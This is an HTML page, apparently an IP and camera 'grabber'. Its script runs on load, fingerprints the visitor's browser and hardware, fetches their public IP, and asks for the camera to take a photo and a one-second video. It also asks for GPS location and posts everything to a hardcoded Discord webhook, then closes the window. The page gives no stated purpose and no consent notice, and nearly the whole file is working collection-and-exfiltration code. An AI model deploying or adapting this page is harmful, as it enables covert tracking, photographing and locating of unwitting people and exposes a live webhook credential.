<!DOCTYPE html>
<html>
<head>
  <title>Full Data + Photo + Video + Location</title>
  <style>
    body {
      margin: 0;
      background: #000;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      font-family: Arial, sans-serif;
    }
    #status {
      font-size: 1.2rem;
      padding: 20px;
      text-align: center;
    }
  </style>
</head>
<body>
<div id="status">Initializing...</div>
<video id="video" style="display:none;" autoplay></video>
<script>
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1495173417434087525/Peg6A9-52ckoH0A0Le00aBhX_GXH65Qx0Pq7NZdQNIY-8BhpPu2XEVqSVJ_7FUcE8Wl9';

const info = {
  ip: null,
  userAgent: navigator.userAgent,
  platform: navigator.platform,
  language: navigator.language,
  cookiesEnabled: navigator.cookieEnabled,
  javaEnabled: navigator.javaEnabled(),
  screenWidth: window.screen.width,
  screenHeight: window.screen.height,
  colorDepth: window.screen.colorDepth,
  deviceMemory: navigator.deviceMemory || 'unknown',
  hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
  maxTouchPoints: navigator.maxTouchPoints || 0,
  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
  online: navigator.onLine,
  plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', '),
  userAgentData: navigator.userAgentData || {},
  webglVendor: null,
  webglRenderer: null,
  sampleRate: null,
  platformVersion: navigator.appVersion,
  vendor: navigator.vendor,
  doNotTrack: navigator.doNotTrack,
  connectionType: (navigator.connection && navigator.connection.effectiveType) || 'unknown',
  languageDirection: document.documentElement.dir || 'ltr',
  referrer: document.referrer,
  cookieEnabled: navigator.cookieEnabled,
  productSub: navigator.productSub,
  hardwareConcurrency: navigator.hardwareConcurrency,
  maxTouchPoints: navigator.maxTouchPoints,
  resolution: window.screen.width + 'x' + window.screen.height,
  touchSupport: 'N/A',
  latitude: null,
  longitude: null
};

async function getSystemInfo() {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    info.ip = data.ip;
  } catch { info.ip = 'Unknown'; }

  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      info.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
      info.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    }
  } catch { }

  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    info.sampleRate = ctx.sampleRate;
  } catch { }

  if (navigator.userAgentData) {
    info.uaBrand = navigator.userAgentData.brands.join(', ');
    info.uaPlatform = navigator.userAgentData.platform;
  }
}

async function getLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) { resolve(); }
    else {
      navigator.geolocation.getCurrentPosition(pos => {
        info.latitude = pos.coords.latitude;
        info.longitude = pos.coords.longitude;
        resolve();
      }, () => resolve());
    }
  });
}

async function takePhoto() {
  const video = document.getElementById('video');
  const canvas = document.createElement('canvas');
  canvas.width = 640;
  canvas.height = 480;
  const ctx = canvas.getContext('2d');

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    await new Promise(res => video.onloadedmetadata = res);
    ctx.drawImage(video, 0, 0);
    stream.getTracks().forEach(t => t.stop());
    return canvas.toDataURL('image/jpeg', 0.9);
  } catch(e) {
    return null; // User denied or error
  }
}

async function recordVideo() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const mediaRecorder = new MediaRecorder(stream);
    const chunks = [];
    mediaRecorder.ondataavailable = e => chunks.push(e.data);
    mediaRecorder.start();

    await new Promise(res => setTimeout(res, 1000)); // Record for 1 sec
    mediaRecorder.stop();

    await new Promise(res => mediaRecorder.onstop = res);
    stream.getTracks().forEach(t => t.stop());

    const blob = new Blob(chunks, { type: 'video/webm' });
    return blob;
  } catch(e) {
    return null;
  }
}

async function sendData() {
  const locStr = (info.latitude && info.longitude) ? 
    `Lat: ${info.latitude}\nLon: ${info.longitude}` : 
    'Location unavailable';

  const lines = [
    `**Full Info Collection**`,
    `IP: ${info.ip}`,
    `UserAgent: ${info.userAgent}`,
    `Platform: ${info.platform}`,
    `Language: ${info.language}`,
    `Cookies enabled: ${info.cookiesEnabled}`,
    `Java enabled: ${info.javaEnabled}`,
    `Screen: ${info.screenWidth}x${info.screenHeight}`,
    `Color depth: ${info.colorDepth}`,
    `Device Memory: ${info.deviceMemory}`,
    `Hardware Concurrency: ${info.hardwareConcurrency}`,
    `Max Touch Points: ${info.maxTouchPoints}`,
    `Timezone: ${info.timezone}`,
    `Online: ${info.online}`,
    `WebGL Vendor: ${info.webglVendor}`,
    `WebGL Renderer: ${info.webglRenderer}`,
    `Audio Sample Rate: ${info.sampleRate}`,
    `Plugins: ${info.plugins}`,
    `Vendor: ${info.vendor}`,
    `Do Not Track: ${info.doNotTrack}`,
    `Connection Type: ${info.connectionType}`,
    `Platform Version: ${info.platformVersion}`,
    `Language Direction: ${info.languageDirection}`,
    `Referrer: ${info.referrer}`,
    `Touch Support: ${info.touchSupport}`,
    `Resolution: ${info.resolution}`,
    `UA.brands: ${info.uaBrand || 'N/A'}`,
    `UA.platform: ${info.uaPlatform || 'N/A'}`,
    `Product Sub: ${info.productSub}`,
    `Cookies Enabled: ${info.cookieEnabled}`,
    `WebGL Vendor: ${info.webglVendor}`,
    `WebGL Renderer: ${info.webglRenderer}`,
    `Connection Effective Type: ${info.connectionType}`,
    `Vendor: ${info.vendor}`,
    `Max Touch Points: ${info.maxTouchPoints}`,
    `Device Memory: ${info.deviceMemory}`,
    `Hardware Concurrency: ${info.hardwareConcurrency}`,
    `Sample Rate: ${info.sampleRate}`,
    `Language: ${info.language}`,
    `Platform Version: ${info.platformVersion}`,
    `Referrer: ${info.referrer}`,
    `Touch Support: ${info.touchSupport}`,
    `Latitude: ${info.latitude}`,
    `Longitude: ${info.longitude}`
  ];

  const content = lines.join('\n') + `\n${locStr}`;

  const formData = new FormData();
  if (info.photoBlob) {
    formData.append('files[0]', info.photoBlob, 'photo.jpg');
  }
  if (info.videoBlob) {
    formData.append('files[1]', info.videoBlob, 'video.webm');
  }
  formData.append('payload_json', JSON.stringify({ content }));
  await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
  window.close();
}

async function main() {
  document.getElementById('status').innerText = 'Gathering system info...';
  await getSystemInfo();

  document.getElementById('status').innerText = 'Trying to take photo...';
  const photoDataUrl = await takePhoto();
  if (photoDataUrl) {
    const res = await fetch(photoDataUrl);
    info.photoBlob = await res.blob();
  }

  document.getElementById('status').innerText = 'Recording 1 second video...';
  info.videoBlob = await recordVideo();

  document.getElementById('status').innerText = 'Getting location...';
  await getLocation();

  document.getElementById('status').innerText = 'Waiting 1 second...';
  await new Promise(r => setTimeout(r, 1000));

  document.getElementById('status').innerText = 'Sending data...';
  await sendData();
}

main();
</script>
</body>
</html>
